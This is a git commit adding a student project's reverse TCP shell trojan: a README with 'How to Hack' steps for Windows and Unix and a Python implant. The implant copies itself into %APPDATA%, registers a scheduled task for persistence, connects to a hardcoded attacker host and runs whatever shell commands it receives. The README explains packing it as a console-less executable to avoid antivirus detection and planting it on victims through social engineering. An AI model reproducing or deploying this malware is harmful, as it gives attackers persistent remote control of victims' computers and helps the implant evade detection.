ee1a24fda1e2f3e0f3e29febf59371214928a751
Dev Patel <109647822+dev-eloper-365@users.noreply.github.com>
2023-01-06 17:07:37 +0530

    6/1/2023

---
+++ Pycode Red Team/py_reverse_node_shell/README.md
@@ -0,0 +1,76 @@
+## CS 460 Final Project
+### Reverse TCP Shell ~~a very stupid trojan~~
+- ywang189 - Yiyi Wang
+- cjsmith7 - Christian Smith
+
+### Multiple files are provided
+- <strong>reverse_tcp.py</strong>
+    -  malicious python code, run it on victim side.
+    -  can be packed into <strong>"exe"</strong> file using <strong>pyinstaller</strong> and run on Windows with no antivirus software detected (tested on Windows8.1, not detected)
+        - On windows, run ``` pyinstaller --noconsole --onefile reverse_tcp.py``` to pack the malicious ```reverse_tcp.py``` to Windows executable file.
+- <strong>listener.js</strong>
+    - simple listener written in javascript(node.js)
+    - <strong> Commands </strong>
+```
+      help
+      exit                    ---   quit listener
+      list                    ---   list victims
+      connect num             ---   connect to one victim
+                                    eg 'connect 0' will connect to the first victim in victim list
+      schedule n_minutes      ---   schedule attack(for Windows only), force victim to try to connect to attacker every n_minutes
+```
+- <strong>schtasks_template.xml</strong>(for Windows hack only)
+    - sample template for schtasks program on Windows
+    - eg: when schedule a malicious task from the <strong>schtasks_template.xml</strong> on Windows, run the following command
+```
+schtasks /CREATE /XML path_to_schtasks_template.xml /TN malicious_task_name
+```  
+- <strong> dist/reverse_tcp.exe </strong>
+    - packed <strong>exe</strong> file using <strong>pyinstaller</strong> mentioned above.
+    - <storng>don't run</strong> this file on your machine, it is <strong>dangerous</strong>(as it will connect to my attack machine at ip 45.55.139.173).
+- <strong>cleanup.bat (for Windows)</strong>
+    - remove our simple stupid trojan from victim's system
+    - double click it to cleanup.
+
+### How to Hack (For Windows)
+1. Edit the variable <strong> attacker_ip  </strong> in <strong> reverse_tcp.py </strong> to attacker's ip address
+2. Run ```pyinstaller --noconsole --onefile reverse_tcp.py``` to create <strong>reverse_tcp.exe</strong>
+3. Copy <strong>reverse_tcp.exe</strong> to victim's machine and execute it. (No console will pop up so don't worry)
+4. Run ```node listener.js``` on attacker's machine to start listening to responses from victims.
+
+### How to Hack (For .nix)
+1. Edit the variable <strong> attacker_ip  </strong> in <strong> reverse_tcp.py </strong> to attacker's ip address
+3. Copy <strong>reverse_tcp.py</strong> to victim's machine and run ```python reverse_tcp.py```.
+4. Run ```node listener.js``` to start listening to responses from victims.
+
+
+### General decriptions
+* On attacker side, execute ```node listener.js``` to run the listener file on attacker's machine.
+* Plant and execute ```reverse_tcp.py``` on victim machine. (SE, camouflage py file as part of package, etc)
+
+### How it works(For Windows)
+* The <Strong>reverse_tcp.py</strong>(<strong>reverse_tcp.exe</strong>) file will first copy itself to %Appdata% folder, then create <strong>schtasks_template.xml</strong> file for scheduling tasks
+* It then runs <strong>schtasks</strong> program and setup the running task so that the victim will try connecting to attacker every 30 minutes by default.
+* After that, victim will try to connect to attacker's ip and port.
+* Attacker will send commands to victim, and victim will execute those commands on their machine.
+
+
+
+### Why implementing Reverse TCP attack in Python
+We first tried <strong>metasploit</strong> and used the <strong>windows/shell_reverse_tcp</strong> payload to generate the malicious <strong>exe</strong> file and we also tried <strong>msfencode</strong> to encode the <strong>exe</strong> file. However, no matter how we encoded the malicious <strong>exe</strong> file, <strong>Windows Defender</strong> could <strong>always</strong> detect it(It is interesting to find out that some 3rd party av couldn't detect our trojan). After doing some researches, we found out that <strong>Windows Defender</strong> will always load the program to memory first then scan it, so encoding will never work.
+
+### Screenshot
+1.
+<img src="screenshot/1.png">  
+2.
+<img src="screenshot/2.png">  
+3.
+<img src="screenshot/3.png">
+
+### What we learnt
+- <strong> Windows Defender </strong> is powerful.
+- <strong> Not all metasploit payloads </strong> work on Windows/
+- <strong> Security awareness is important </strong>
+- <strong> Security is fun. CS460 is an awesome class.</strong>
+
+# Thanks ;)
---
+++ Pycode Red Team/py_reverse_node_shell/tcp.py
@@ -0,0 +1,145 @@
+#/usr/bin/env python
+### Use python 2
+### let victim run this file
+### To convert this file to windows exe, use "pyinstaller" and run "pyinstaller --noconsole --onefile reverse_tcp.py"
+### ===========
+### How to run this file
+### python reverse_tcp.py
+### python reverse_tcp.py attacker_ip
+###      eg:
+###           python reverse_tcp.py 192.168.2.5
+###
+
+attacker_ip = "temp999-39068.portmap.io"        ## attacker's ip, change this ip address if necessary.
+
+
+import socket, subprocess, os, platform, sys
+
+
+'''
+   generate xml content according to schtasks_template.xml
+   for schtasks program hack (windows only)
+'''
+def generateScheduleTask(schedule_interval_minutes):
+    return """<?xml version="1.0" encoding="UTF-16"?>
+<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
+  <RegistrationInfo>
+  </RegistrationInfo>
+  <Triggers>
+    <TimeTrigger>
+      <Repetition>
+        <Interval>PT""" + str(schedule_interval_minutes) + """M</Interval>
+        <StopAtDurationEnd>false</StopAtDurationEnd>
+      </Repetition>
+      <StartBoundary>2015-05-06T23:24:00</StartBoundary>
+      <Enabled>true</Enabled>
+    </TimeTrigger>
+  </Triggers>
+  <Principals>
+    <Principal id="Author">
+      <LogonType>InteractiveToken</LogonType>
+      <RunLevel>LeastPrivilege</RunLevel>
+    </Principal>
+  </Principals>
+  <Settings>
+    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
+    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
+    <StopIfGoingOnBatteries>true</StopIfGoingOnBatteries>
+    <AllowHardTerminate>true</AllowHardTerminate>
+    <StartWhenAvailable>false</StartWhenAvailable>
+    <RunOnlyIfNetworkAvailable>true</RunOnlyIfNetworkAvailable>
+    <IdleSettings>
+      <StopOnIdleEnd>true</StopOnIdleEnd>
+      <RestartOnIdle>false</RestartOnIdle>
+    </IdleSettings>
+    <AllowStartOnDemand>true</AllowStartOnDemand>
+    <Enabled>true</Enabled>
+    <Hidden>false</Hidden>
+    <RunOnlyIfIdle>false</RunOnlyIfIdle>
+    <WakeToRun>false</WakeToRun>
+    <ExecutionTimeLimit>P3D</ExecutionTimeLimit>
+    <Priority>7</Priority>
+  </Settings>
+  <Actions Context="Author">
+    <Exec>
+      <Command>""" + os.getenv("APPDATA") +  """\\reverse_tcp.exe</Command>
+    </Exec>
+  </Actions>
+</Task>
+    """
+
+### For Windows system
+### Initialize necessary settings.
+if (platform.system() == "Windows"):
+    ### Get APPDATA path
+    appdata_path = os.getenv("APPDATA");
+    target_path = appdata_path + "\\reverse_tcp.exe"   ## target path, this program will copy itself to that path
+    current_path = os.path.abspath(__file__)
+    ### Check whether file already copied to %Appdata%\reverse_tcp.exe
+    if os.path.isfile(target_path): # already exists, do nothing
+        pass
+    else:
+
+        ### Create schtasks_template.xml
+        with open(appdata_path + "\\schtasks_template.xml", "w") as xml:
+            xml.write(generateScheduleTask(30))  ## interval 30 minutes
+            # xml.close()
+
+        ### Copy self to %Appdata% for Windows. (%Appdata%\reverse_tcp.exe)
+        ### current path is .py file(although we are running .exe file), so need to change it to .exe file extension.
+        os.system("copy " + current_path[:-2]+"exe" + " " + target_path)
+
+        ### Setup schtasks for Windows.
+        ### Run every 30 minutes.
+        ### The the name of schedule task is reverse_tcp
+        os.system("schtasks /CREATE /XML " + appdata_path + "\\schtasks_template.xml /TN reverse_tcp")
+
+
+if len(sys.argv) >= 2:
+    attacker_ip = sys.argv[1]       ## get attacker's ip from command line
+attacker_port = 47188                ## attacker's port
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)   ## connect to attacker's machine
+s.connect((attacker_ip, attacker_port))
+
+while True:
+    command = s.recv(1024)        # receive attacker's remote command
+    if command == "exit":         # quit shell
+        break
+    if len(command) > 3 and command[0: 3] == "cd ": # change directory
+        try:
+            os.chdir(command[3:])
+            s.send(" ")
+        except:
+            s.send("cd: " + command[3:] + ": No such file or directory")
+        continue;
+    if len(command) > 9 and command[0: 9] == "schedule ": # schedule the task when victim connect to attacker
+        if (platform.system() == "Windows"):
+            ## get task interval
+            minutes = int(command[9:])
+
+            try:
+                ## create template
+                xml = open(os.getenv("APPDATA") + "\\schtasks_template.xml", "w");
+                xml.write(generateScheduleTask(minutes))  ## interval 30 minutes
+                xml.close()
+
+                ## create task
+                os.system("schtasks /CREATE /XML " + os.getenv("APPDATA") + "\\schtasks_template.xml /TN reverse_tcp")
+                s.send("The scheduled task has successfully been created")
+            except:
+                s.send("Error, failed to schedule task")
+            continue
+        else: # wrong os
+            s.send("Only for Windows system can use [schedule] command.")
+            continue;
+
+
+    # run command
+    proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+    output = proc.stdout.read()  + proc.stderr.read()
+    if len(output) == 0:
+        output = " "
+    s.send(output)
+
+# done
+s.close()
